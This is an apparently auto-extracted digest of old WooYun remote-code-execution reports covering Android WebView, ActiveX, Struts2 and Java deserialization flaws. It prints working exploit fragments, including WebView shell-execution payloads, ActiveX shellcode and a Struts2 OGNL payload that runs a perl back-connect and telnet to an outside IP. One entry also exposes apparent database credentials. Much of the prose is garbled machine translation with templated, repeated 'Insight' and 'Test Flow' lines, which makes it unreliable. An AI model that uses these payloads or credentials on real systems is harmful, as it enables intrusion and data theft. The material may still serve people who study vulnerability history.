# RCE Vulnerability Analysis

> Automatically extracted on 2026-01-23 18:57
> Sample count: 3

## Meta-thinking Patterns

### Attack Pattern Distribution
```
  Execution: 3 times
```

## Representative Cases

### Case 1: wooyun-2014-071487
**Title**: LoL/DuowanDuowan BoxAPPremotecommandexecution vulnerability
**Original Type**: Vulnerability type:remote code execution
**URL Examples**:
  - `https://example.com/[redacted]`
**Insight Extract**:
**Payload Snippets**:
  ```
  org/papers/548Iandroidsystemis4.1.2function execute(cmdA
  ```
  ```
  orName("java.lang.Runtime").getMethod("getRuntime",n
  ```
  ```
  ;} #1successindynamic circlepublish post#2interface
  ```

### Case 2: wooyun-2014-050162
**Title**: dolphin zero APPremote code execution vulnerability
**Original Type**: Vulnerability type:remote code execution
**URL Examples**:
  - `https://example.com/[redacted]`
**Insight Extract**:
  - textisandroid webviewinterfaceissueissueoccursee cause details:https://example.com/[redacted]
**Payload Snippets**:
  ```
  android webviewinterfaceissueissueoccursee cause details:https://example.com/[redacted]
  ```
  ```
  or (var obj in window) {if ("getClass" in window[obj
  ```
  ```
  <script>var i=0;function getContents(inputStream){var con
  ```

### Case 3: wooyun-2014-066107
**Title**: Volansroutercommand arbitrary executioncan gain ROOT control of the router
**Original Type**: Vulnerability type:remote code execution


---

## Batch 2 (Index 200-399)
> Sample count: 3

### High-frequency Parameters
```
  repo: 1 times
  apkpackagename: 1 times
  error: 1 times
  packagename: 1 times
  intent: 1 times
```

### Representative Cases

#### wooyun-2015-0145365
**a certain search engineinput methodAndroid versionhas remoteobtaininformationcontroluserlineasvulnerability(canmaliciouspush contentetc.4Gnetworkinsidecantexttotarget)**
- Parameters: `repo, apkpackagename, error, packagename, intent`
- Payload: `oreign Address         State       PID/Program namet`

#### wooyun-2014-048949
**114web directory(app)commandExecution**
- Payload: `org/papers/548<script>function execute(cmdArgs) {ret`

#### wooyun-2011-01334
**a certain e-commerce platforma certain e-commerceIMtoolremoteActiveXoverflow0DAY**
- Payload: `<script>var buffer = '';while (buffer.length < 1111) buff`

---

## Batch 3 (Index 400-599)
> Samples: 2

### Representative Cases

#### wooyun-2013-033347
**a certain universitybusiness schoolStruts2commandExecution**

#### wooyun-2012-09915
**well-known sitesourceforgesubsitecompromised**

---

## Batch 4 (Index 600-799)
> Samples: 3

### High-frequency Parameters
```
  id: 1
  url: 1
```

### Representative Cases

#### wooyun-2013-044771
**globalNo.threelargemanagementsoftwareVendorSage(SAGE)ERPproducthasgeneric remote code execution**
- Parameters: `id`

#### wooyun-2015-092544
**a certain search enginebrowser7.0.600 bdbrowser://protocolleakagecan readhistory listetc.etc.**
- Parameters: `url`

#### wooyun-2014-077978
**a certain IM software2015APPremote code execution vulnerability+vulnerabilityexploitPOC(canattackspecified user)**
- Payload: `<script type="text/javascript">for(w in window){document.`
---
### [wooyun-2014-066531] 4Gbrowserremote code execution vulnerability
**Vendor**: roboo.com | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: downloadRoboo4Gbrowser:https://example.com/[redacted]

**POC**: searchaddJavascriptInterfaceNavigatorinterfacevulnerabilityconstructonewrite file+popupExp:<html><head><title>test</title></head><body><script>function execute(testcmd){return Navigator.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(testcmd);}try{execute(["/system/bin/sh","-c","echo 'Webviewremote

**Bypass**: Direct exploitation

**Fix**: :)
---

---
### [wooyun-2012-09541] NationalPublic Trust Networkremote execution
**Vendor**: Public Trust Network | **Year**: 2012 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: thistextisstate agency,requesting a certificaterequesting a certificate
---

---
### [wooyun-2012-07456] windows live(msn)click to openMsnexecute local files and commands
**Vendor**: Microsoft | **Year**: 2012 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: please seeWooYun: a certain Internet companyclick to opena certain Internet companymessage execute local files and commandsthe principle is the same----Apudo not mind..borrowed your idea

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: I do not know
---

---
### [wooyun-2015-0144554] Baofeng Videoclientcanbe man-in-the-middle attackremote execution(with demo video)
**Vendor**: Baofeng Video | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: upload functionality

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: after installingBaofeng Video  enter the main interfacewhen   inlower-left cornerhastwo peoplefunctionality (Baofeng Games)(Qingfeng Channel)clickBaofeng Gameswhen ,a prompt popped up!foriscapture packetsstudied it  !modified the packetthensubmit   !Iinserveruploadonefile  textnamedas:BF-BFGame.exe  andtextlook attofilebesuccessdownload!waited a few seconds!successdownloadandtextexecute remotedownloadcalculator!short videodownloadaddress: https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: verify the returned file digital signature!
---

---
### [wooyun-2011-01311] a certain downloadtoolActiveXcontrol stack overflowvulnerability
**Vendor**: a certain Internet company | **Year**: 2011 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: vulnerabilityhasfora certain browserplugin.dllin,forunicodetextcodeURLnotexteffective length checkcausingonestack overflowvulnerability,textfornew versiontextaddtext/gstranslated text,textcanoverwriteexception handling,textunable toinfunctionreturntexttriggertranslated textobtain control permissions.

**POC**: <html><script language="javascript">url = "ftp://"for (var i = 0; i < 0x300; i ++){url += "\u4141\u4141";}var s = new ActiveXObject("a certain browserplugin.a certain browserfunctionality.2");s.SendUrl4(url, "http://[IP redacted]", "test", "", 0, 0, "", "", "");</script></html>

**Bypass**: encoding bypass

**Fix**: lengthcheck~~
---

---
### [wooyun-2016-0166496] China Railway Constructiona certain sitehasjavadeserializationvulnerability
**Vendor**: China Railway Construction | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: China Railway Constructiona certain sitehasjavadeserializationvulnerability.address:http://**.**.**.**:7001/logonAction.do

**POC**: China Railway Constructiona certain sitehasjavadeserializationvulnerability.address:http://**.**.**.**:7001/logonAction.do

**Bypass**: Direct exploitation

**Fix**: .....
---

---
### [wooyun-2015-0106714] a certain bankcredit cardclienta certain bankAPPhas remotedebug interface
**Vendor**: a certain bank | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: vulnerabilityimpact:a certain bankAPPAndroidclientusercantextset"userlog in"debug interface,causinga certain bankcredit cardwebsiteweb APIexpose,textclientsecurity.cause analysis:cancanisdeveloperputprogramtest versionmistakenly releasedtextuser.

**POC**: 1,textwebsiteondownloadandinstalla certain bankAPPAndroid V3.3.13after,clientwilltextV3.4.2,directlyinstallupgrade.2,starttextclientV3.4.2,intranslated text"text"textsingletextpointonetext,text"online cinema",againclickmobile phone"menu key",inparttextsingleintext"set", clientwillappearTitleas"userlog in"debug interface.3,intextundertranslated textintextclick,text"production"text,entry-1andservertextcopytextthenwilltranslated texturl,andparttranslated text.texturltexthas"Payment",Itranslated texta certain bankpayment APIhastext.texturlusehttpastext,andnoSSLencrypt.

**Bypass**: Direct exploitation

**Fix**: developertranslated textandpublishtextversion,putthisdebug interfaceremove,andtextgoodtextAPIcallmethod.
---

---
### [wooyun-2015-0161450] a certain rural commercial banka systemremote code execution vulnerability
**Vendor**: a certain rural commercial bank | **Year**: 2015 | **Type**: successintrusion incident

**Meta-thinking**: Trigger signal: functional testing

**Insight**: successintrusion incident lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify successintrusion incident-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: **.**.**.**:7001/defaultroot/login.jspbrowsewebsitedirectory,thenftpdownloadonejsptextontext,thenforwardoneunderremoteport,herethennotoneonetest

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0111084] stealthy methodBypassarbitraryantivirussoftwaredefense system/destroyantivirussoftware/localarbitrary code execution/remotearbitrary code execution
**Vendor**: CNCERT | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain date,after playing LOL,iswhenshut down once,then...a certain textuseprogramnotext- -text?a certain somenotextnobeclose,thatisnotisotherallbeclosetext?wetextcomelook atlook atWindowstranslated text:System Signal -> Shutdown Process -> Power Offtextthis way,thatweisnotiscancapture signal,translated textsecurity softwareallggwhentranslated textorexecute codeorotherprogram?MSDNtextwe,WindowstextusefortextsystemtextAPI,for exampletextandtext.thislocationtextintextcode- -good~,the core line,throughCancelmethodcomeblock shutdown,thenExecutiontest.localtestedinterception succeeded.good,theninsert your own code.textdestroythentextprogram,textquietlytextuseaftertranslated textthentextcertificate,textcanremote executionscripttext~ translated text~ texttest peopledestroysecurity software.(textcertificateandtextsecurity softwareneedmanagementpermissions,onlyisExecutioncustom codenotneed.)thislocationtextintextcode- -Ok,textoneunder,killtextfilethencan.testtranslated text

**POC**: EXPsource code,candownloadtest.(C#.Net)(exampleisKingsoft Guard)GitHub:https://example.com/[redacted] - Ithistextpoor codethennottextontext...

**Bypass**: Direct exploitation

**Fix**: temporarily disableAutoEndTaskstextshouldis justtext,probably usable.do not know360ishow it is done,textisputselfassystemcore process?!
---

---
### [wooyun-2016-0171125] patching gapsofTaiwanjoomlacode executionpackage-school(Taiwan region)
**Vendor**: HitconTaiwantranslated textvulnerabilityreporting platform | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: joomlacode execution**.**.**.**     patent technology matching platform - a certain university | patent technology matching platform**.**.**.**   a certain universityChongde Society**.**.**.**   http://**.**.**.**/    a certain universitycreative design degree program**.**.**.**   Department and Graduate Institute of Maritime Information Technology

**POC**: as above

**Bypass**: Direct exploitation

**Fix**: upgradelatest version
---

---
### [wooyun-2015-0145283] a certain security vendoraSVvulnerabilityNo.onepartofRemote Code Execution
**Vendor**: a certain security vendor | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: Parametersinjection, authentication interface

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: exploitthisvulnerabilityprerequisite:needlog inaSVcontrolconsoletextpermissionstextlow(www-data),soself-assessedvulnerabilityasinissuecodetextinqrencode.plon,developerselfgo backcheck#!/usr/bin/perl -w#1,obtaininput parametersmy $r = Apache2::RequestUtil->request();my $cgi = CGI->new($r);my $need_encode_intext = $cgi->param( 'need_encode_intext' );exit (0) if(!defined($need_encode_intext) || ($need_encode_intext eq ""));#2,based on input parametersgetQR codeimagemy $qrencode_png_name = 'tmp_qrencode.png';my $qrencode_png_path = "/tmp/$qrencode_png_n

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: youtext
---

---
### [wooyun-2016-0166769] a provinciallocal tax bureaua systemhasjavadeserializationvulnerability
**Vendor**: cncertNational Internet Emergency Center | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: Yunnan Provincelocal tax bureauportal systemhasjavadeserializationvulnerabilityvulnerabilityurl:**.**.**.**:7001/console/login/LoginForm.jsp1,checklook atuserpermissions2,checklook atIP

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: upgradeweblogic
---

---
### [wooyun-2014-075003] a certain music appAndroid clienthaswebview codeexecution vulnerability
**Vendor**: a certain Internet company | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2014-049946] a certain securitybrowserPad versionremote code execution vulnerability
**Vendor**: a certain security vendor | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: browsercometextthis kind ofissuetextisneedpatchexportsearchBoxJavaBridge_seemsisrelated to the Google search box.inandroid 4.0mobile phoneontestactually exists,4.2versions abovenothasfunction execute(cmdArgs){return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}testpage:https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: need to delete this interface,callremoveJavascriptInterfacemethodhttps://example.com/[redacted]
---

---
### [wooyun-2015-0160347] a provincial China Unicom companya systemjavadeserializationvulnerabilitycausingserverbetext
**Vendor**: a provincial China Unicom company | **Year**: 2015 | **Type**: successintrusion incident

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: successintrusion incident lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify successintrusion incident-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: http://**.**.**.**:7001/alreadyenterremotessh,log inserver

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2010-0267] Guotai JunansecuritiesFutong page trading security controlhas remoteoverflowvulnerability
**Vendor**: Guotai Junan | **Year**: 2010 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: file:CsswebLogin.ocxversion:[IP redacted] & [IP redacted]clsid:F43B35B7-C29A-453F-86E9-C37412269D62property:SetPswStr

**POC**: Heap Spray,everyonealltext

**Bypass**: Direct exploitation

**Fix**: restrictionParameterslength
---

---
### [wooyun-2015-095498] Dolphin Browserlatest versionremote code execution vulnerability
**Vendor**: Dolphin Browser | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: manyinterfacehasjsinjectionetc.issuewrite fileexp:<html><head><title>test</title></head><body><script>function execute(testcmd){return Android.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(testcmd);}try{execute(["/system/bin/sh","-c","echo 'Webviewremotecommandexecution vulnerabilitytest.' > /sdcard/paxmac.txt"])

**Bypass**: Direct exploitation

**Fix**: carefully checktheseinterface.handle it.
---

---
### [wooyun-2016-0171660] a certain telecom operatora certain important systemvulnerabilitycanlog innationwidelarge amount ofChina Unicommobile phonenumberenteronline service halloperation
**Vendor**: a certain telecom operator | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: allChina Unicomusertextaffected...1. a certain telecom operatora certain important systemvulnerabilitytheoreticallycanlog innationwideallChina Unicommobile phonenumberenteronline service halloperation[text:18666666666]2. canqueryallChina Unicommobile phonenumbercodesendtext10010SMSuseandsystemreplySMScontent[traffic/points/balance/WLANpasswordetc.etc.]a certain telecom operatortextwebsitemanagementsystemhasdeserializationexecution vulnerability**.**.**.**:7001/efbadmin/

**POC**: getshell:**.**.**.**:7001/uddi/unicome.jsp  wooyuncollecttextconfigurationinformation:bms.url=jdbc:oracle:thin:@**.**.**.**:1525/ecombms.username=ltzbyytbms.password=l4t5z9b7t0ytcollecttolarge amount ofChina Unicomstaff account passwords email mobile phonenumber  social engineering informationthroughdatadatabaseoperationtextcantexttomoreemailaccountandpassword

**Bypass**: Direct exploitation

**Fix**: heard reporting to WooYun pays?
---

---
### [wooyun-2014-066796] UCa certain versionbrowserhascodeexecution vulnerability
**Vendor**: UC Mobile | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: UCbrowserTV version([IP redacted])downloadlink(official):https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2013-035573] a certain search enginetextlocal version(TTPlayer5.0)hastextlocationheapstack overflowcanexecute arbitrarycode
**Vendor**: a certain search engine | **Year**: 2013 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: #!/usr/bin/pythonimport sys, time, os,zipfileimagefuzzer="A"*4096imagefuzzer1="A"skinxmltmp="<skin version=\"2\" name=\"fuck\" author=\"fucker\" url=\"https://example.com/[redacted]" email=\"fucker@fucker.com\" transparent_color=\"#ff00ff\">\<player_window image=\"" + imagefuzzer1*512 + """ "><play position="8,

**Bypass**: Direct exploitation

**Fix**: checkbuffer length
---

---
### [wooyun-2013-042025] Kingsoft Guardremote code execution
**Vendor**: Kingsoft Antivirus | **Year**: 2013 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: Kingsoft Guardinlocationhandletextprotectionwhenhashijacktext,itsinsavekswebshield.dll,ksfmon.dllmodule,textksfmon.dllusemessage hookinjectiontoalllocationhandlemessageprocessin.textiftextthenisinstallKingsoft Guardallprogramallcanbedll hijack,hijackmoduleaskernelbase.dll.look attextwordaffectedwinraraffectedXunleiaffected

**POC**: whytextisremotetext?puttoshared folderremotetextquestionopentextaffected.of courseputwebdavtextonetext

**Bypass**: Direct exploitation

**Fix**: translated text,programmers understand
---

---
### [wooyun-2014-050247] SooyieCMShastextusetextremote code execution
**Vendor**: CNCERT | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: producttextasaspxandjspversion jsplargetextuseforgovhttps://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2013-036272] a provincialeducation departmenta certain  peoplebusiness systemvulnerability
**Vendor**: a provincialeducation department | **Year**: 2013 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: Shaanxi Provinceinprimary school student status management systemhttp://[IP redacted]

**POC**: useshack2 brotherStruts2vulnerabilityexploittoolotherthennottext.iftextdo not believeif,Icantextonepointperipheral evidence,thistextmanagementsystemis15 peoplevirtual-machine cluster,textinthattextcloud platformon.

**Bypass**: Direct exploitation

**Fix**: 1. textStruts2Patch;2. checkfilesystemintegrity.
---

---
### [wooyun-2012-07813] a certain mobile phonegamea certain siteremote code execution vulnerability
**Vendor**: a certain Internet company | **Year**: 2012 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]]%27%29%28meh%29=true&%28aaa%29%28%28%27\u0023context[\%27xwork.MethodAccessor.denyMethodExecution\%27]\u003d\u0023foo%27%29%28\u0023foo\u003dnew%20java.lang.Boolean%28%22false%22%29%29%29&%28asdf%29%28%28%27\u0023rt.exec%28%22%20perl%20\u002ftmp\u002fspider\u005fbc%20183.20.164.224%2012345%20%22%

**POC**: ?('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&(aaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('\u0023rt.exec(%22 telnet [IP redacted] 12345 %22)')(\u0023rt \u003d@java.lang.Runtime@g

**Bypass**: Direct exploitation

**Fix**: thistextvulnerability official patch offline,seemsthisbusiness suspended,a certain Internet companytexthandleunder.hassmall rewardtext me and @text
---

---
### [wooyun-2016-0167798] a certain municipal human resources and social security bureaua certain sitejavadeserializationvulnerability
**Vendor**: cncertNational Internet Emergency Center | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textalsomunicipal human resources and social security bureaua certain sitejavadeserializationvulnerability.address:**.**.**.**:7001/hso/logonDialog_113.jsp

**POC**: textalsomunicipal human resources and social security bureaua certain sitejavadeserializationvulnerability.address:**.**.**.**:7001/hso/logonDialog_113.jsp

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2012-07517] Xunleilook atlook atcomponentexploitremote executionspecifiedprogramvulnerability
**Vendor**: Xunlei | **Year**: 2012 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: exploit https://example.com/[redacted] hope it is fixed quickly

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: exploitsuch high value did not think about the fix level textyoubusy for a while
---

---
### [wooyun-2012-016705] 010 Edit buffer overflowvulnerability
**Vendor**: SweetScape | **Year**: 2012 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: whenuseruseCalculatorExecutionmaliciousconstructcommandtext,willtriggerbuffer overflow.issuecodetextintext,textfortwice towardbufferassign value,counttextonlytextone,causingbufferbeoverwriteoverflow

**POC**: triggervulnerabilitypoc:0x23, 0x64, 0x65, 0x66, 0x69, 0x6E, 0x65, 0x20,0x61, 0x20, 0x22, 0x5C, 0x61, 0x5C, 0x61, 0x5C,0x61, 0x5C, 0x61, 0x5C, 0x61, 0x5C, 0x61, 0x5C,0x61, 0x5C, 0x61, 0x5C, 0x61, 0x5C, 0x61, 0x5C,0x61, 0x5C, 0x61, 0x5C, 0x61, 0x5C, 0x61, 0x5C,0x61, 0x5C, 0x61, 0x5C, 0x61, 0x5C, 0x61, 0x5C,0x61, 0x5

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2014-062585] eighttextarbitrary code execution(textservertextcompromised)
**Vendor**: eighttext | **Year**: 2014 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: upload functionality

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: nginx/0.8.54 translated text peopleuploadtextthenline

**POC**: main sitetextbeblack-market operatorsdirectoryalreadybesetforce hidden textservertextbeprivilege escalation

**Bypass**: Direct exploitation

**Fix**: serverneedtexthandleoneundertextwebsiteistextDEDECMS DZ 74CMS etc.textprogram coordinatetranslated textExecution textnottextdatadatabaseinsidetextalreadybetranslated textaftertextsoheretextunder translated textdatadatabasetranslated textis one timesmajor operation
---

---
### [wooyun-2015-099026] 2345input methodlocalprivilege escalationexecution vulnerability
**Vendor**: 2345web directory | **Year**: 2015 | **Type**: privilege escalation

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: privilege escalation lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify privilege escalation-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: version:2.3 largetext:28M  update date:2015.02.04twolocationhasuseCreateProcess()functioncreate new processanditsmain thread,forforCreateProcessfunction,Windowtextiftextstartprogramnamednameandtext numberinpackettranslated text,thattextthesenamednameandParametersintranslated textCreateProcessfunctionbeforetextusedouble quotes""enterlinepackettext,for examplec:/program files/sub dir/program name,if notuse""packettext,textWindowcancanwilloccurambiguity.install2345input methodtext2345PinyinSvc.execantextpathcodeexecution vulnerabilityand2345input methodsetfunctionality2345PinyinConfig.execantextpathcodeexecution vulnerabilityreference:WooYun: a certain search engineinput methodcallCreateProcessfunctionvulnerability

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: a certain search engine
---

---
### [wooyun-2011-01386] Pipi PlayerActiveXappearoverflowvulnerabilityNo.threetext
**Vendor**: Pipi.com | **Year**: 2011 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: Pipi PlayerAcitvexcontrolJfCheck.dllsetCookieNo.twoParametersnottexthastextsecuritycheck,causingstack overflow.attackercanexploitthisvulnerabilityenterlineplant malware

**POC**: <html><body><object classid='clsid:632C6705-17AB-4407-9281-F60D0A7726BE' id="target"></object><script>shellcode = unescape('%uc931%ue983%ud9de%ud9ee%u2474%u5bf4%u7381%u3d13%u5e46%u8395'+'%ufceb%uf4e2%uaec1%u951a%u463d%ud0d5%ucd01%u9022%u4745%u1eb1'+'%u5e72%ucad5%u471d%udcb5%u72b6%u94d5%u77d3%u0c9e%u

**Bypass**: Direct exploitation

**Fix**: forParametersenterlinecheck
---

---
### [wooyun-2014-068662] a certain downloadAPPremote code execution vulnerability
**Vendor**: Xunlei | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: reference:https://example.com/[redacted] execute(cmdArgs){return share.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}

**POC**: 1,textontext,web browsing mode2,interfacetext

**Bypass**: Direct exploitation

**Fix**: see:https://example.com/[redacted]
---

---
### [wooyun-2013-042144] PHPYunlocalfile inclusioncausearbitrary code execution
**Vendor**: PHPYun talentsystem | **Year**: 2013 | **Type**: file inclusion

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: file inclusion lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify file inclusion-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: vulnerabilityappearinplus/outside.phpNo.10linedirectlytextquestionthisphp,Parameterstranslated textpackettextfilepath.callmethod:[IP redacted]

**POC**: vulnerabilityappearintextconstructonejpgfile,insidetranslated textexecute codethenthroughuploadprofile photo,putimageuploadontext.thentexttoimagetextthentextquestion

**Bypass**: Direct exploitation

**Fix**: foridenterlinefilterrestrictionthisfiledirectlytextquestion
---

---
### [wooyun-2015-0120513] Kingsoft security suite(New Antivirus"Wukong"+ Kingsoft Guard)remote code execution vulnerability
**Vendor**: Kingsoft Antivirus | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

